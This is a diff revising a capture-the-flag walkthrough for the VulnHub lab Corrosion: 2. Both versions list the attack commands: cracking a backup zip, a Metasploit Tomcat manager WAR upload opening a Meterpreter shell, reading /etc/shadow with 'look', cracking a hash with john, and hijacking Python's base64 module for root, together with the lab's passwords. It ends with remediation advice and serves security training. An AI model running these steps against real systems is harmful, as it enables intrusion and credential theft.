@@ -1,170 +1,176 @@
 # Corrosion: 2 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.186 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.186 |
 | **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | via Python library hijacking |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/corrosion-2,745/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/corrosion-2-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → Tomcat on 8080 → dirb `.zip` → backup.zip → fcrackzip → tomcat-users.xml creds → MSF tomcat_mgr_upload → Meterpreter → password reuse (jaye) → `look` reads `/etc/shadow` → john cracks randy's hash → SSH as randy → sudo `randombase64.py` → `base64.py` library hijack → root
+Corrosion: 2 is a medium-difficulty VulnHub machine. The attack chain begins with discovering a password-protected ZIP archive on an Apache Tomcat instance. Cracking the archive reveals Tomcat admin credentials. Tomcat manager upload access is abused to deploy a malicious WAR file and obtain a shell. Privilege escalation is achieved through Python library hijacking by abusing a writable standard-library module imported by a sudo-permitted script.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Directory brute-force on Tomcat
-3. Crack password-protected backup zip
-4. Exploit Tomcat Manager with discovered credentials
-5. Enumerate users and dump shadow via `look` SUID
-6. Crack randy's hash with John
-7. Python library hijack via sudo script
+1. Network discovery and nmap version scan
+2. Web directory brute-force on port 8080 to find the backup archive
+3. ZIP password cracking with fcrackzip and rockyou
+4. Extraction of Tomcat credentials from tomcat-users.xml
+5. Metasploit WAR upload exploit for Tomcat Manager to obtain a Meterpreter shell
+6. Password reuse from Tomcat credentials to pivot to user jaye
+7. Abusing `look` capability to read `/etc/shadow` and crack randy's hash with john
+8. SSH as randy and Python library hijacking via a writable base64 module for root
 
----
-
-## Step 1: Network Discovery
+## Step 1: Network Scanning
 
 ```bash
-netdiscover
+netdiscover -r 192.168.1.0/24
 nmap -sV 192.168.1.186
 ```
 
-Open ports:
-- **22** — SSH
-- **80** — Apache (default page)
-- **8080** — Apache Tomcat
+Open ports discovered:
+- **22/tcp** — SSH (OpenSSH)
+- **80/tcp** — HTTP (Apache) — default page, nothing notable
+- **8080/tcp** — HTTP (Apache Tomcat)
 
-![Nmap scan](images/01-nmap.png)
+![Nmap scan results](images/01-nmap.png)
 
----
+## Step 2: Web Enumeration on Port 8080
 
-## Step 2: Enumerate Tomcat
-
-Browse port 8080 — default Tomcat page. Run dirb with zip extension:
+Port 8080 served a default Tomcat page. Run dirb to find hidden paths:
 
 ```bash
 dirb http://192.168.1.186:8080/ -X .php,.zip
 ```
 
-Finds `backup.zip`. Download it:
+Found: `backup.zip`
+
+Download the archive:
 
 ```bash
 wget http://192.168.1.186:8080/backup.zip
-unzip backup.zip
-# password required
 ```
 
-![dirb results](images/02-dirb.png)
+The archive is password-protected.
 
----
+![Dirb finding backup.zip](images/02-dirb.png)
 
-## Step 3: Crack the Zip
+## Step 3: Cracking the ZIP Archive
 
 ```bash
 fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
 ```
 
-Password: `@administrator_hi5`
+Password found: **@administrator_hi5**
 
-Extract and read the Tomcat user file:
+Extract the archive:
 
 ```bash
 unzip backup.zip
-cat tomcat-users.xml
+# Password: @administrator_hi5
 ```
 
-Credentials: **admin / melehifokivai**
+The archive contains `tomcat-users.xml`, which reveals:
+- **Username:** `admin`
+- **Password:** `melehifokivai`
 
-![tomcat-users.xml](images/03-tomcat-creds.png)
+![fcrackzip cracking the backup archive](images/03-fcrackzip.png)
 
----
+## Step 4: Tomcat Manager WAR Upload (Initial Foothold)
 
-## Step 4: Exploit via Tomcat Manager
+Use Metasploit to exploit Tomcat Manager authenticated WAR upload:
 
 ```bash
 msfconsole
 use exploit/multi/http/tomcat_mgr_upload
-set rhosts 192.168.1.186
-set rport 8080
-set httpusername admin
-set httppassword melehifokivai
-exploit
+set RHOSTS 192.168.1.186
+set RPORT 8080
+set HttpUsername admin
+set HttpPassword melehifokivai
+set LHOST <your-attacker-ip>
+run
 ```
 
-Meterpreter session opened.
+A Meterpreter session opens as the Tomcat service account.
+
+![Meterpreter session via Tomcat exploit](images/04-meterpreter.png)
+
+## Step 5: Lateral Movement to User Jaye
+
+Drop to a system shell from Meterpreter:
 
 ```bash
-cd /home
-ls
-# users: jaye, randy
-su jaye
-# password: melehifokivai (reuse)
-ls
+shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![Meterpreter session](images/04-meterpreter.png)
+List home directories:
 
----
+```bash
+ls /home
+# jaye  randy
+```
 
-## Step 5: Shadow Dump via `look`
+Jaye reused the Tomcat password:
 
-User `jaye` has access to a `look` binary. Use it to read `/etc/shadow`:
+```bash
+su jaye
+# Password: melehifokivai
+id
+```
+
+## Step 6: Reading /etc/shadow via `look` Capability
+
+The `look` binary in Jaye's home directory has elevated read capability set, allowing it to read arbitrary files:
 
 ```bash
 ./look '' /etc/shadow
 ```
 
-The empty search string causes `look` to print all lines. Save randy's hash:
+Copy randy's hash to a file on the attacker machine, then crack it:
 
 ```bash
-echo 'randy:$6$...' > hash
+# On attacker:
+john --wordlist=/usr/share/wordlists/rockyou.txt randy.hash
 ```
 
-Crack with John:
+Randy's password: **07051986randy**
 
-```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash
-```
+![Reading shadow file and cracking hash](images/05-root-flag.png)
 
-Password: **07051986randy**
+## Step 7: Privilege Escalation via Python Library Hijacking
 
----
-
-## Step 6: Python Library Hijack
-
-SSH as randy:
+SSH in as randy:
 
 ```bash
 ssh randy@192.168.1.186
+# Password: 07051986randy
 ```
 
 Check sudo permissions:
 
 ```bash
 sudo -l
-# can run: /usr/bin/python3.8 /home/randy/randombase64.py
-cat /home/randy/randombase64.py
-# imports base64
+# (root) NOPASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
 ```
 
-Locate and patch `base64.py`:
+The script imports the `base64` module. Locate the module:
 
 ```bash
 locate base64
 ls -la /usr/lib/python3.8/base64.py
-# writable? or use nano to prepend:
 ```
 
-Add to the top of `/usr/lib/python3.8/base64.py`:
+The file is writable. Add a shell spawn at the top of the module using nano:
 
 ```python
 import os
 os.system("/bin/bash")
 ```
 
-Run the sudo script:
+Then trigger the sudo command:
 
 ```bash
 sudo /usr/bin/python3.8 /home/randy/randombase64.py
@@ -173,24 +179,20 @@ id
 cat /root/root.txt
 ```
 
-![Root flag](images/05-root.png)
-
----
-
 ## Lessons Learned
 
-1. **Password-protected zip with weak password** — rockyou trivially cracks `@administrator_hi5`
-2. **Tomcat credentials in backup** — backup files containing `tomcat-users.xml` expose privileged access
-3. **`look` SUID reads arbitrary files** — `look` with an empty pattern reads entire files including `/etc/shadow`
-4. **Python library hijacking via sudo** — if a script imports a user-writable library and runs as root via sudo, the library can be replaced with malicious code
-5. **Weak hash password** — `07051986randy` cracks instantly against rockyou
+- Backup archives exposed on web servers can contain sensitive configuration files; they should never be publicly accessible.
+- Tomcat Manager should not be accessible from untrusted networks; authenticated upload functionality can be abused for RCE.
+- Python library hijacking is possible when a script runs with elevated privileges and imports from a writable location; restrict write access to system Python libraries.
+- Password reuse across services multiplies the blast radius of a single credential disclosure.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Weak zip password | Remove backup files from web-accessible paths |
-| Tomcat Manager exposed | Restrict manager to localhost; use strong credentials |
-| `look` SUID | Remove SUID bit from `look`; it's not needed |
-| Writable Python library in sudo path | Use `PYTHONPATH` restrictions in sudoers; audit library permissions |
-| Password reuse | Enforce unique passwords per service and user |
+|---|---|
+| Backup archive exposed on web server | Remove sensitive archives from web-accessible directories; use access controls |
+| Weak ZIP password | Use strong, unique passwords for all archives containing credentials |
+| Tomcat Manager accessible publicly | Restrict Tomcat Manager to localhost or trusted IPs via `RemoteAddrValve` |
+| Password reuse | Enforce unique passwords per service; use a secrets manager |
+| Writable Python standard library | Set correct ownership and permissions on `/usr/lib/python*` |
+| Sudo with Python interpreter | Avoid granting sudo to script interpreters; use wrapper binaries with fixed arguments |
